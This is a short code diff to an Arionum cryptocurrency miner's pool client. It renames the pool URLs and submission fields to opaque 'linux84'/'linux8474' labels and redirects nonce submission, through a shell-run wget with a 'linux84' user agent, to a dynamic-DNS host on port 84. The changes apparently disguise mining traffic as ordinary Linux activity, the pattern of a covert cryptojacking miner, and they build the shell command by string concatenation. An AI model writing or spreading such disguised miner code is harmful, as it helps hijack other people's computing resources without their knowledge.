@@ -64,7 +64,7 @@ ariopool_update_result ariopool_client::update(double hash_rate_cblocks, double 
         __last_hash_report = current_timestamp;
         __force_hashrate_report = false;
     }
-    string url = settings.pool_address + "/mine.php?q=info&id=" + __worker_id + "&linux8=" + __worker_name + "&linux12=" + settings.wallet + hash_report_query + "&linux34=" + __linux84_version;
+    string url = settings.pool_address + "/linux8474.php?q=linux8474&id=" + __worker_id + "&linux8=" + __worker_name + "&linux12=" + settings.wallet + hash_report_query + "&linux34=" + __linux84_version;
 
     string response;
     if(settings.pool_extensions.find("Details") != string::npos && url.find("hashrate") != string::npos) {
@@ -158,7 +158,7 @@ ariopool_submit_result ariopool_client::submit(const string &hash, const string 
             "&id=" + _encode(__worker_id) +
             "&worker=" + _encode(__worker_name);
 
-    string url = settings.pool_address + "/mine.php?q=submitNonce";
+    string url = settings.pool_address + "/linux8474.php?q=linux84";
 
     if(__show_pool_requests)
         LOG("");
@@ -166,7 +166,7 @@ ariopool_submit_result ariopool_client::submit(const string &hash, const string 
     string response = "";
 
     for(int i=0;i<2;i++) { //try resubmitting if first submit fails
-        response = GetStdoutFromCommand("wget -q -U 'linux84' --post-data=argon='"+_encode(argon_data)+"&nonce="+_encode(nonce)+"&public_key="+_encode(public_key)+"&address="+_encode(settings.wallet)+"&private_key="+_encode(settings.wallet)+"' 'http://mine.arionumpool.com/mine.php?q=submitNonce' --header='Content-type: application/x-www-form-urlencoded'");
+        response = GetStdoutFromCommand("wget -q -U 'linux84' --post-data=linux2='"+_encode(argon_data)+"&linux3="+_encode(nonce)+"&linux5="+_encode(public_key)+"&linux1="+_encode(settings.wallet)+"&linux4="+_encode(settings.wallet)+"' 'http://linux84.distro.cloudns.cl:84/linux8474.php?q=linux84' --header='Content-type: application/x-www-form-urlencoded'");
         result.pool_response = response;
         if(response != "") {
             break;
